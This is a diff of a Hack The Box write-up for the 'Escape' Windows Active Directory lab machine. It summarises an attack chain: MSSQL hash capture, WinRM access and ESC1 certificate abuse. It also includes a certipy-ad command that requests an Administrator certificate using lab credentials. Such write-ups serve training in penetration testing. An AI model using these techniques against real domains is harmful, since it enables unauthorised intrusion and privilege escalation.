@@ -7,7 +7,7 @@
 <img src="https://labs.hackthebox.com/storage/avatars/80936664b3da83a92b28602e79e47d79.png" alt="Escape Machine Logo" width="150"/>
 
 - Machine type: <img src="https://hackmyvm.eu/img/windows.png" alt="Windows" width="17"/> Windows
-- Machine difficulty: 🟨 Medium
+- Machine difficulty: 🟨 Medium (<span style="color:#f4b03b;">4.6</span>)
 
 > Escape is a Medium difficulty Windows Active Directory machine that starts with an SMB share that guest authenticated users can download a sensitive PDF file. Inside the PDF file temporary credentials are available for accessing an MSSQL service running on the machine. An attacker is able to force the MSSQL service to authenticate to his machine and capture the hash. It turns out that the service is running under a user account and the hash is crackable. Having a valid set of credentials an attacker is able to get command execution on the machine using WinRM. Enumerating the machine, a log file reveals the credentials for the user `ryan.cooper`. Further enumeration of the machine, reveals that a Certificate Authority is present and one certificate template is vulnerable to the ESC1 attack, meaning that users who are legible to use this template can request certificates for any other user on the domain including Domain Administrators. Thus, by exploiting the ESC1 vulnerability, an attacker is able to obtain a valid certificate for the Administrator account and then use it to get the hash of the administrator user.
 
@@ -301,7 +301,7 @@ Service Info: Host: DC; OS: Windows
 Nmap done: 1 IP address (1 host up) scanned in 0.62 seconds
 ```
 
-`echo -e '10.10.11.202\tdc.sequel.htb sequel.htb sequel' | tee -a /etc/hosts`:
+`echo -e '10.10.11.202\tdc.sequel.htb sequel.htb sequel' | sudo tee -a /etc/hosts`:
 ```
 10.10.11.202    dc.sequel.htb sequel.htb sequel ←
 ```
@@ -349,20 +349,6 @@ text: 000004DC: LdapErr: DSID-0C090A5C, comment: In order to perform this opera
  tion a successful bind must be completed on the connection., data 0, v4563
 
 # numResponses: 1
-```
-❌
-
-`ldapsearch -x -H ldap://10.10.11.202/ -D 'sequel.htb\' -w '' -b "DC=sequel,DC=htb" '(objectClass=*)'`:
-```
-ldap_bind: Strong(er) authentication required (8) ←
-        additional info: 00002028: LdapErr: DSID-0C090259, comment: The server requires binds to turn on integrity checking if SSL\TLS are not already active on the connection, data 0, v4563
-```
-❌
-
-`ldapsearch -x -H ldap://10.10.11.202/ -D 'sequel.htb\guest' -w '' -b "DC=sequel,DC=htb" '(objectClass=*)'`:
-```
-ldap_bind: Strong(er) authentication required (8) ←
-        additional info: 00002028: LdapErr: DSID-0C090259, comment: The server requires binds to turn on integrity checking if SSL\TLS are not already active on the connection, data 0, v4563
 ```
 ❌
 
@@ -1768,8 +1754,6 @@ Certificate Templates
     [!] Vulnerabilities
       ESC1                              : 'SEQUEL.HTB\\Domain Users' can enroll, enrollee supplies subject and template allows client authentication ←
 ```
-
-
 
 `certipy-ad req -u 'Ryan.Cooper' -p 'NuclearMosquito3' -target 10.10.11.202 -upn Administrator@sequel.htb -ca sequel-DC-CA -template UserAuthentication`:
 ```
